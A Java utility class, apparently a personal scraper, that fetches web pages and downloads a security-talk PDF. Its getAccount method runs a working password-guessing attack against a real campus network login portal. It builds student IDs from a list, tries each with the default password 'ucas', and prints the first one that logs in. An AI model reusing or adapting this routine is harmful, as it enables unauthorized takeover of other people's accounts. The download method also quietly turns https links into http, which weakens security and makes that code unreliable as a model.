import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by ZXD on 2017/4/23.
 */
public class HttpUtils {
    public static Document getPage(String url) {
        Document doc = null;
        try {
            doc = Jsoup.connect(url).timeout(5000)
                    .header("Accept-Encoding", "deflate")
                    .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36")
                    .get();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return doc;
    }

    public static void download(String targetUrl, File target) {
        try {
            URL url = new URL(targetUrl.replace("https://", "http://"));
            URLConnection connection = url.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36");
            connection.setRequestProperty("Accept-Encoding", "deflate");
            InputStream is = connection.getInputStream();
            byte[] buffer = new byte[is.available()];
            FileOutputStream writer = new FileOutputStream(target);
            int readLen;
            while ((readLen = is.read(buffer)) != -1) {
                writer.write(buffer, 0, readLen);
            }
            writer.flush();
            writer.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void getAccount() throws Exception {
        String[] years = {"2012", "2013", "2014"};
        BufferedReader reader = new BufferedReader(new FileReader("G:\\java_program\\PaperSprider\\sid.txt"));
        String line;
        String url = "http://210.77.16.21/eportal/InterFace.do?method=login";
        boolean flag = false;
        while ((line = reader.readLine()) != null && !flag) {
            for (String year: years) {
                String num = year + line.substring(4);
                Map<String, String> data = new HashMap<>();
                data.put("userId", num);
                data.put("password", "ucas");
                data.put("service", "");
                data.put("queryString", "wlanuserip%3Df39d702ca0df2e111ae80d31d511c706%26wlanacname%3D5fcbc245a7ffdfa4%26ssid%3D%26nasip%3D2c0716b583c8ac3cbd7567a84cfde5a8%26mac%3Db797ed2ab023e626efebdf25e303b028%26t%3Dwireless-v2%26url%3D709db9dc9ce334aac3704f5211c2cc853a4383fa5b360e0d");
                data.put("operatorPwd", "");
                data.put("validcode", "");

                String ret = Jsoup.connect(url).timeout(5000)
                        .header("Accept-Encoding", "deflate")
                        .header("Host", "210.77.16.21")
                        .header("Origin", "http://210.77.16.21")
                        .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
                        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36")
                        .header("Cookie", "EPORTAL_COOKIE_USERNAME=; EPORTAL_COOKIE_PASSWORD=; EPORTAL_COOKIE_SERVER=; EPORTAL_COOKIE_SERVER_NAME=; EPORTAL_COOKIE_DOMAIN=false; EPORTAL_COOKIE_SAVEPASSWORD=false; EPORTAL_AUTO_LAND=false; EPORTAL_COOKIE_OPERATORPWD=; JSESSIONID=3EE961670FFC3FB6FD0E244CFB9915EF")
                        .data(data)
                        .post().text();
                if (!ret.contains("fail")) {
                    System.out.println(num);
                    flag = true;
                    break;
                }
            }
        }
    }

    public static void main(String[] args) {
        File file = new File("G:\\java_program\\PaperSprider", "20 Years of Network and Distributed Systems Security The Good, the Bad, and the Ugly.pdf");
        System.out.println(file.getName());
        download("http://www.internetsociety.org/sites/default/files/Presentation_Kemmerer.pdf", file);
    }
}
